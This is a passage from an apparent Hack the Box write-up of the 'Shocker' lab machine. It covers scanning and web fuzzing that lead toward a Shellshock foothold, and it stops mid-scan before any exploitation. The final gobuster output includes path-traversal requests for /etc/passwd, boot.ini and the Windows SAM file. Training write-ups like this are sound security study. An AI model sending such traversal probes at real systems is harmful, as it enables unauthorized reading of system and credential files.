---
layout: post
layout: default
title: "Shocker"
description: "My writeup for the HacktheBox Shocker machine. An easy box that involved exploiting Shellshock followed by a Perl GTFOBin."
category_string: "Hack the Box (HTB)"
custom_css: ['blogs']
---

# Hack the Box - Shocker

# Contents
- [Shocker Overview](#shocker-overview)
  - [Ratings](#ratings)
  - [Tags](#tags)
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
    - [All ports](#all-ports)
    - [UDP](#udp)
    - [Vuln Checks](#vuln-checks)
  - [Gobuster](#gobuster)
  - [Autorecon](#autorecon)
- [OpenSSH ](#openssh)
- [Website](#website)
  - [Enumerating Tech Stack](#enumerating-tech-stack)
  - [More Fuzzing](#more-fuzzing)
  - [Shellshock](#shellshock)
    - [Background](#background)
    - [Fuzzing for Shellshock](#fuzzing-for-shellshock)
      - [Gobuster Debugging](#gobuster-debugging)
      - [Fuzzing for Vulnerable Binaries](#fuzzing-for-vulnerable-binaries)
    - [Getting a Shell](#getting-a-shell)
- [Shell as Shelly](#shell-as-shelly)
  - [Basic Enumeration](#basic-enumeration)
- [Key Lessons](#key-lessons)

# Shocker Overview

This is the eighth box in my OSCP prep series. It was also one of the boxes for Hack the Box's #takeiteasy dare challenge.

**Box Details**

|IP|OS|User-Rated Difficulty|Date Started|Date Completed|
|---|---|---|---|---|
|10.10.10.56|Linux|3.6|2021-06-14|2021-06-14|

---

This box had a straightforward expoit, but with some tricky enumeration. The initial foothold was provided via Shellshock, a common vulnerability in scripts that set environment variables. But due to a strange configuration in the server, finding the appropriate shellshockable file required you to use the exact combination of tools and wordlists, which took a while. Root access was more simple, and just involved a GTFOBin on perl.

## Ratings

I rated user a 3 - it took me about two hours to enumerate and find the Shellshock vulnerability, but only 20 minutes once I did. A lot of that time was documenting what I was doing - this is fine when I'm learning, but I need to be quicker on the exam.

I rated root a 2 - it was very simple, and only took me 20 minutes once I had a user shell.

Here is my matrix rating, which is quite high on all aspects:

![](/assets/images/blogs/Pasted image 20210614105519.png)

Shellshock is widely exploited (or was for a long time), the foothold was just a CVE, and the box required a good amount of enumeration to find the vulnerable file. A good box overall!

## Tags

#oscp-prep #linux #no-metasploit #web #shellshock #perl #sudo #takeiteasy 

# Enumeration

## Nmap

I started with an `nmap` scan:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ nmap -sC -sV -v -Pn -oA nmap/shocker 10.10.10.56
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-14 08:22 BST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:22
Completed NSE at 08:22, 0.00s elapsed
Initiating NSE at 08:22
Completed NSE at 08:22, 0.00s elapsed
Initiating NSE at 08:22
Completed NSE at 08:22, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 08:22
Completed Parallel DNS resolution of 1 host. at 08:22, 0.00s elapsed
Initiating Connect Scan at 08:22
Scanning 10.10.10.56 [1000 ports]
Discovered open port 80/tcp on 10.10.10.56
Discovered open port 2222/tcp on 10.10.10.56
Completed Connect Scan at 08:22, 0.46s elapsed (1000 total ports)
Initiating Service scan at 08:22
Scanning 2 services on 10.10.10.56
Completed Service scan at 08:22, 6.12s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.56.
Initiating NSE at 08:22
Completed NSE at 08:22, 1.53s elapsed
Initiating NSE at 08:22
Completed NSE at 08:22, 0.33s elapsed
Initiating NSE at 08:22
Completed NSE at 08:22, 0.00s elapsed
Nmap scan report for 10.10.10.56
Host is up (0.036s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 08:22
Completed NSE at 08:22, 0.00s elapsed
Initiating NSE at 08:22
Completed NSE at 08:22, 0.00s elapsed
Initiating NSE at 08:22
Completed NSE at 08:22, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.79 seconds

```

Key findings:
- webserver running on port 80, with Apache 2.4.18
- SSH running on non-standard port 2222
- Ubuntu box

### All ports

I also did a full port scan:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ sleep 300; nmap -p- -Pn -oA nmap/shocker-allports 10.10.10.56
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-14 08:33 BST
Nmap scan report for 10.10.10.56
Host is up (0.030s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 13.52 seconds
```

### UDP

And a UDP scan:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ sudo nmap -sU -Pn -oA nmap/shocker-udp 10.10.10.56
[sudo] password for mac: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-14 08:40 BST
Nmap scan report for 10.10.10.56
Host is up (0.022s latency).
All 1000 scanned ports on 10.10.10.56 are closed

Nmap done: 1 IP address (1 host up) scanned in 1006.91 seconds
```

### Vuln Checks

I ran `nmap`'s `vuln` script to see if there were any quick wins:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ nmap --script vuln -Pn -oA nmap/shocker-vuln 10.10.10.56
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-14 08:27 BST
Nmap scan report for 10.10.10.56
Host is up (0.043s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 323.34 seconds
```

The vuln check identified port 2222 as running EtherNetIP-1, not SSH, so I ran a quick searchsploit:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ searchsploit ethernetip
Exploits: No Results
Shellcodes: No Results
Papers: No Results
```

But it found nothing.

## Gobuster

I ran a `gobuster` scan on the site:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ gobuster dir -u http://10.10.10.56 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/14 08:31:09 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 291]
/.htm                 (Status: 403) [Size: 290]
/.                    (Status: 200) [Size: 137]
/.htaccess            (Status: 403) [Size: 295]
/.htc                 (Status: 403) [Size: 290]
/.html_var_DE         (Status: 403) [Size: 298]
/server-status        (Status: 403) [Size: 299]
/.htpasswd            (Status: 403) [Size: 295]
/.html.               (Status: 403) [Size: 292]
/.html.html           (Status: 403) [Size: 296]
/.htpasswds           (Status: 403) [Size: 296]
/.htm.                (Status: 403) [Size: 291]
/.htmll               (Status: 403) [Size: 292]
/.html.old            (Status: 403) [Size: 295]
/.ht                  (Status: 403) [Size: 289]
/.html.bak            (Status: 403) [Size: 295]
/.htm.htm             (Status: 403) [Size: 294]
/.htgroup             (Status: 403) [Size: 294]
/.hta                 (Status: 403) [Size: 290]
/.html1               (Status: 403) [Size: 292]
/.html.printable      (Status: 403) [Size: 301]
/.html.LCK            (Status: 403) [Size: 295]
/.htm.LCK             (Status: 403) [Size: 294]
/.html.php            (Status: 403) [Size: 295]
/.htaccess.bak        (Status: 403) [Size: 299]
/.htmls               (Status: 403) [Size: 292]
/.htx                 (Status: 403) [Size: 290]
/.htlm                (Status: 403) [Size: 291]
/.htuser              (Status: 403) [Size: 293]
/.html-               (Status: 403) [Size: 292]
/.htm2                (Status: 403) [Size: 291]
                                               
===============================================================
2021/06/14 08:33:14 Finished
===============================================================
```

It found nothing - I would end up having to do a few extra `gobuster` scans later on.

## Autorecon

I also launched an autorecon scan after spending some time manually enumerating the webserver and finding nothing, just in case I'd missed something obvious:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ autorecon 10.10.10.56
```

It didn't find any new services. I checked out the `nikto` and `whatweb` scans to see if they raised any new vulnerabilities that I hadn't seen:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker/results/10.10.10.56/scans]
└─$ cat tcp_80_http_nikto.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.56
+ Target Hostname:    10.10.10.56
+ Target Port:        80
+ Start Time:         2021-06-14 09:07:03 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 89, size: 559ccac257884, mtime: gzip
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8674 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-06-14 09:11:13 (GMT1) (250 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
┌──(mac㉿kali)-[~/Documents/HTB/shocker/results/10.10.10.56/scans]
└─$ cat tcp_80_http_whatweb.txt
WhatWeb report for http://10.10.10.56:80
Status    : 200 OK
Title     : <None>
IP        : 10.10.10.56
Country   : RESERVED, ZZ

Summary   : HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], Apache[2.4.18], HTML5

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and 
	maintain an open-source HTTP server for modern operating 
	systems including UNIX and Windows NT. The goal of this 
	project is to provide a secure, efficient and extensible 
	server that provides HTTP services in sync with the current 
	HTTP standards. 

	Version      : 2.4.18 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ HTML5 ]
	HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           : Ubuntu Linux
	String       : Apache/2.4.18 (Ubuntu) (from server string)

HTTP Headers:
	HTTP/1.1 200 OK
	Date: Mon, 14 Jun 2021 08:14:47 GMT
	Server: Apache/2.4.18 (Ubuntu)
	Last-Modified: Fri, 22 Sep 2017 20:01:19 GMT
	ETag: "89-559ccac257884-gzip"
	Accept-Ranges: bytes
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 134
	Connection: close
	Content-Type: text/html
```

They didn't seem to find anything useful.

# OpenSSH 

I ran `searchsploit` against openssh (this was after spending some time enumerating the website and getting nowhere, which I'll detail in the next section):

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ searchsploit openssh
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------

OpenSSH 7.2 - Denial of Service                                                                                                                                        | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                                                                | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                                                                   | linux/remote/40136.py

OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                                                                   | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                                                               | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                                                                   | linux/remote/45939.py
```

The most promising exploit, `multiple/remote/39569.py`,  requires authentication.

I even tried logging in with no username/key just in case there was some weird SSH misconfiguration:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ ssh -p 2222 10.10.10.56
The authenticity of host '[10.10.10.56]:2222 ([10.10.10.56]:2222)' can't be established.
ECDSA key fingerprint is SHA256:6Xub2G5qowxZGyUBvUK4Y0prznGD5J2UyeMhJSdCZGw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.10.56]:2222' (ECDSA) to the list of known hosts.
mac@10.10.10.56's password: 
Permission denied, please try again.
mac@10.10.10.56's password: 
Permission denied, please try again.
mac@10.10.10.56's password: 
```

But no luck. It was worth doing our due diligence here, but SSH likely isn't vulnerable.

# Website

The website is very simple, with just an image and a title:

![](/assets/images/blogs/Pasted image 20210614082656.png)

There's nothing interesting in the source, either:

![](/assets/images/blogs/Pasted image 20210614082713.png)

I also checked the Apache version number out in ExploitDB and Google, but it didn't find much besides a local priv esc and a couple of denial of service attacks.

## Enumerating Tech Stack

I did some poking around to see what technologies might be running on the server. Visiting `index.html` worked:

![](/assets/images/blogs/Pasted image 20210614085530.png)

But `index.php` didn't:

![](/assets/images/blogs/Pasted image 20210614085505.png)

This means gobuster rightly should have found stuff without any extra `-x` parameters, as there's nothing so far to suggest that the server is running PHP. `curl -v` tells us nothing new either:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ curl -v http://10.10.10.56
*   Trying 10.10.10.56:80...
* Connected to 10.10.10.56 (10.10.10.56) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.56
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 14 Jun 2021 08:01:26 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Last-Modified: Fri, 22 Sep 2017 20:01:19 GMT
< ETag: "89-559ccac257884"
< Accept-Ranges: bytes
< Content-Length: 137
< Vary: Accept-Encoding
< Content-Type: text/html
< 
 <!DOCTYPE html>
<html>
<body>

<h2>Don't Bug Me!</h2>
<img src="bug.jpg" alt="bug" style="width:450px;height:350px;">

</body>
</html> 
* Connection #0 to host 10.10.10.56 left intact
```

## More Fuzzing

I had a look through the seclists folder to see if there were any other useful looking lists:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ ls /usr/share/seclists/Discovery/Web-Content/
```

I checked the size of the apache-related ones:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker]
└─$ wc -l /usr/share/seclists/Discovery/Web-Content/apache.txt 
32 /usr/share/seclists/Discovery/Web-Content/apache.txt
┌──(mac㉿kali)-[~/Documents/HTB/shocker/results/10.10.10.56/scans]
└─$ wc -l /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt 
8531 /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt
```

And scanned using the biggest list:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker/results/10.10.10.56/scans]
└─$ gobuster dir -u http://10.10.10.56 -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/14 09:30:51 Starting gobuster in directory enumeration mode
===============================================================
//.htaccess           (Status: 403) [Size: 295]
//.htaccess.bak       (Status: 403) [Size: 299]
//.htpasswd           (Status: 403) [Size: 295]
//index.html          (Status: 200) [Size: 137]
//server-status       (Status: 403) [Size: 299]
                                               
===============================================================
2021/06/14 09:31:15 Finished
===============================================================
```

It found nothing.

## Shellshock

Due to the name of the box, I started googling for shellshock vulnerabilities, as I'd heard of the exploit but never used it. This felt a little bit disingenuous - I'm not sure if boxes are 'named' on the OSCP exam, so I was hoping to be able to find the exploit naturally with enumeration rather than via clues in the name and on forums.

Despite this, I hadn't gotten anywhere, and I didn't know *what* to look for with shellshock. I found an excellent OWASP Article that opened the door for some next steps: [https://owasp.org/www-pdf-archive/Shellshock\_-\_Tudor_Enache.pdf](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf)

### Background

The exploit seems to be in a malicious functions definition in a bash environment variable:

![](/assets/images/blogs/Pasted image 20210614092556.png)

Specifically, it mentions these attack vectors:

![](/assets/images/blogs/Pasted image 20210614092358.png)

With this setup for attacking apache:

![](/assets/images/blogs/Pasted image 20210614092432.png)

And this payload:

![](/assets/images/blogs/Pasted image 20210614092454.png)

### Fuzzing for Shellshock

I checked for the script mentioned in the slides, but it wasn't on the server:

![](/assets/images/blogs/Pasted image 20210614093230.png)

Is the directory present?

![](/assets/images/blogs/Pasted image 20210614093422.png)

Yes! I can't list it, but I can now fuzz it.

#### Gobuster Debugging

Before I moved on, I thought it's quite irritating that this didn't show up on my `gobuster` scans. I decided to look into why it failed, but you can skip to the [next section](#fuzzing-for-vulnerable-binaries) if you're not interested.

I'm not sure what wordlist I should have used. I did a quick `grep` within the directory for `cgi-bin`:

This threw up a lot of results, as it also matched searches containing this phrase - I ran an exact match to filter some stuff out:

```bash
┌──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ grep -Ri "^cgi-bin$" .
./raft-large-words-lowercase.txt:cgi-bin
./directory-list-1.0.txt:cgi-bin
./Oracle EBS wordlist.txt:cgi-bin
./frontpage.txt:cgi-bin
./directory-list-2.3-medium.txt:cgi-bin
./directory-list-2.3-medium.txt:CGI-BIN
./directory-list-lowercase-2.3-small.txt:cgi-bin
./SVNDigger/all-dirs.txt:cgi-bin
./SVNDigger/all.txt:cgi-bin
./raft-small-words-lowercase.txt:cgi-bin
./common-and-portuguese.txt:cgi-bin
./raft-medium-words-lowercase.txt:cgi-bin
./raft-large-words.txt:cgi-bin
./raft-large-words.txt:CGI-BIN
./raft-large-words.txt:Cgi-bin
./raft-large-words.txt:CGI-Bin
./raft-large-words.txt:Cgi-Bin
./raft-large-words.txt:cgi-Bin
./raft-large-words.txt:CGI-bin
./big.txt:cgi-bin
./common-and-spanish.txt:cgi-bin
./common-and-french.txt:cgi-bin
./raft-medium-directories.txt:cgi-bin
./raft-medium-directories.txt:CGI-BIN
./raft-medium-directories.txt:Cgi-bin
./raft-medium-directories.txt:CGI-Bin
./raft-medium-directories.txt:Cgi-Bin
./raft-medium-directories.txt:cgi-Bin
./common.txt:cgi-bin
./raft-large-directories-lowercase.txt:cgi-bin
./directory-list-2.3-small.txt:cgi-bin
./directory-list-2.3-small.txt:CGI-BIN
./apache.txt:cgi-bin
./directory-list-2.3-big.txt:cgi-bin
./directory-list-2.3-big.txt:CGI-BIN
./directory-list-lowercase-2.3-big.txt:cgi-bin
./raft-medium-words.txt:cgi-bin
./raft-medium-words.txt:CGI-BIN
./raft-medium-words.txt:Cgi-bin
./raft-medium-words.txt:CGI-Bin
./raft-medium-words.txt:Cgi-Bin
./raft-medium-words.txt:cgi-Bin
./sunas.txt:cgi-bin
./raft-medium-directories-lowercase.txt:cgi-bin
./common-and-italian.txt:cgi-bin
./api/objects.txt:cgi-bin
./raft-small-directories.txt:cgi-bin
./raft-small-directories.txt:CGI-BIN
./raft-small-directories.txt:Cgi-bin
./oracle.txt:cgi-bin
./iplanet.txt:cgi-bin
./raft-small-words.txt:cgi-bin
./raft-small-words.txt:CGI-BIN
./raft-small-words.txt:Cgi-bin
./raft-small-words.txt:CGI-Bin
./raft-small-words.txt:Cgi-Bin
./raft-large-directories.txt:cgi-bin
./raft-large-directories.txt:CGI-BIN
./raft-large-directories.txt:Cgi-bin
./raft-large-directories.txt:CGI-Bin
./raft-large-directories.txt:Cgi-Bin
./raft-large-directories.txt:cgi-Bin
./raft-large-directories.txt:CGI-bin
./domino-endpoints-coldfusion39.txt:cgi-bin
./common-and-dutch.txt:cgi-bin
./directory-list-lowercase-2.3-medium.txt:cgi-bin
./raft-small-directories-lowercase.txt:cgi-bin
```

It looks like pretty much every wordlist checks for `cgi-bin` - *including* the one I used. So why didn't gobuster highlight it?

I tried a couple of other tools. `wfuzz` also failed to find it:

```bash
┌──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ wfuzz -u http://10.10.10.56/FUZZ -w raft-small-words.txt --hc 404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.56/FUZZ
Total requests: 43003

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                 
=====================================================================

000000007:   403        11 L     32 W       291 Ch      ".html"                                                                                                                                 
000000038:   403        11 L     32 W       290 Ch      ".htm"                                                                                                                                  
000000400:   200        9 L      13 W       137 Ch      "."                                                                                                                                     
000000589:   403        11 L     32 W       295 Ch      ".htaccess"                                                                                                                             
000002138:   403        11 L     32 W       290 Ch      ".htc"                                                                                                                                  
000003475:   403        11 L     32 W       298 Ch      ".html_var_DE"                                                                                                                          
000004659:   403        11 L     32 W       299 Ch      "server-status"                                                                                                                         
000005736:   403        11 L     32 W       295 Ch      ".htpasswd"                                                                                                                             
000006495:   403        11 L     32 W       292 Ch      ".html."                                                                                                                                
000007255:   403        11 L     32 W       296 Ch      ".html.html"                                                                                                                            
000008280:   403        11 L     32 W       296 Ch      ".htpasswds"                                                                                                                            
000010844:   403        11 L     32 W       291 Ch      ".htm."                                                                                                                                 
000011528:   403        11 L     32 W       292 Ch      ".htmll"                                                                                                                                
000012350:   403        11 L     32 W       295 Ch      ".html.old"                                                                                                                             
000013429:   403        11 L     32 W       295 Ch      ".html.bak"                                                                                                                             
000013428:   403        11 L     32 W       289 Ch      ".ht"                                                                                                                                   
000014573:   403        11 L     32 W       294 Ch      ".htm.htm"                                                                                                                              
000017669:   403        11 L     32 W       290 Ch      ".hta"                                                                                                                                  
000017671:   403        11 L     32 W       292 Ch      ".html1"                                                                                                                                
000017670:   403        11 L     32 W       294 Ch      ".htgroup"                                                                                                                              
000019900:   403        11 L     32 W       301 Ch      ".html.printable"                                                                                                                       
000019899:   403        11 L     32 W       295 Ch      ".html.LCK"                                                                                                                             
000022817:   403        11 L     32 W       294 Ch      ".htm.LCK"                                                                                                                              
000027081:   403        11 L     32 W       299 Ch      ".htaccess.bak"                                                                                                                         
000027083:   403        11 L     32 W       292 Ch      ".htmls"                                                                                                                                
000027082:   403        11 L     32 W       295 Ch      ".html.php"                                                                                                                             
000027084:   403        11 L     32 W       290 Ch      ".htx"                                                                                                                                  
000033266:   403        11 L     32 W       291 Ch      ".htlm"                                                                                                                                 
000033268:   403        11 L     32 W       292 Ch      ".html-"                                                                                                                                
000033267:   403        11 L     32 W       291 Ch      ".htm2"                                                                                                                                 
000033269:   403        11 L     32 W       293 Ch      ".htuser"                                                                                                                               

Total time: 0
Processed Requests: 43003
Filtered Requests: 42972
Requests/sec.: 0
```

As did gobuster with the `raft-small-directories-lowercase.txt`, which contains multiple variations on `cgi-bin`:

```bash
┌──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ grep cgi-bin raft-small-directories-lowercase.txt 
cgi-bin
scgi-bin
fcgi-bin
cgi-bin2
_cgi-bin
private-cgi-bin
vcgi-bin
cgi-bin-church
cgi-bin-debug
cgi-bin-live
cgi-bin_ssl
pcgi-bin
```

I tried again with `wfuzz`, this time adding a `/`, and it found the directory almost immediately:

```bash
┌──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ wfuzz -u http://10.10.10.56/FUZZ/ -w raft-small-directories-lowercase.txt --hc 404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.56/FUZZ/
Total requests: 17770

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                 
=====================================================================

000000001:   403        11 L     32 W       294 Ch      "cgi-bin"                                                                                                                               
000000370:   403        11 L     32 W       292 Ch      "icons"
```

This is extremely annoying, and actually a little worrying for the exam if common tools don't consistently pick up on directories like this.

After finishing the box, I looked at [Rana Khalil's writeup](https://ranakhalil101.medium.com/hack-the-box-shocker-writeup-w-o-metasploit-feb9e5fa5aa2) (as always) - she used the following gobuster command to enumerate directories:

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.56 -f
```

My command didn't find it as `/cgi-bin` returns a 404, whereas `/cgi-bin/` returns a 403. This is sort of uncommon behaviour - usually if a directory exists and is accessed without a `/`, the webserver should redirect with a 302. Gobuster usually picks up on this, but this webserver didn't redirect for whatever reason so it was missed.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/shocker/www]
└─$ curl http://10.10.10.56/cgi-bin
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /cgi-bin was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
</body></html>
┌──(mac㉿kali)-[~/Documents/HTB/shocker/www]
└─$ curl http://10.10.10.56/cgi-bin/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /cgi-bin/
on this server.<br />
</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
</body></html>
```

This is a good example of why to read writeups from other people as you prep - it's okay to take hints as well, especially if you use it to learn *how* they got to that point. I often peek at a hint, then try to figure out what I'd have to google to come up with that result.

#### Fuzzing for Vulnerable Binaries

Once again, I'll go over how I searched for the target binary - but you can skip to [exploiting it](#getting-a-shell) if you wish.

A couple of good things came out of my Gobuster woes - one was the valuable lesson to use a bigger wordlist or a different tool to fuzz if you're getting no results. The second was the discovery of a wordlist specifically for CGI files! I used this to fuzz for exploitable files on the server:

```bash
┌──(mac㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w CGIs.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                CGIs.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/14 09:50:35 Starting gobuster in directory enumeration mode
===============================================================
/./                   (Status: 403) [Size: 294]
Progress: 82 / 3389 (2.42%)                   [ERROR] 2021/06/14 09:50:36 [!] parse "http://10.10.10.56/cgi-bin/%NETHOOD%/": invalid URL escape "%NE"
/?mod=node&nid=some_thing&op=view (Status: 403) [Size: 294]
/?mod=some_thing&op=browse (Status: 403) [Size: 294]       
//                    (Status: 403) [Size: 295]            
/?OpenServer          (Status: 403) [Size: 294]            
/?Open                (Status: 403) [Size: 294]            
[ERROR] 2021/06/14 09:50:37 [!] parse "http://10.10.10.56/cgi-bin/%a%s%p%d": invalid URL escape "%a%"
/%2e/                 (Status: 403) [Size: 294]            
[ERROR] 2021/06/14 09:50:37 [!] parse "http://10.10.10.56/cgi-bin/default.htm%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%": invalid URL escape "%"
/../../../../../../../../../boot.ini (Status: 400) [Size: 303]
/../../../../winnt/repair/sam._ (Status: 400) [Size: 303]     
/DomainFiles/*//../../../../../../../../../../etc/passwd (Status: 400) [Size: 303]
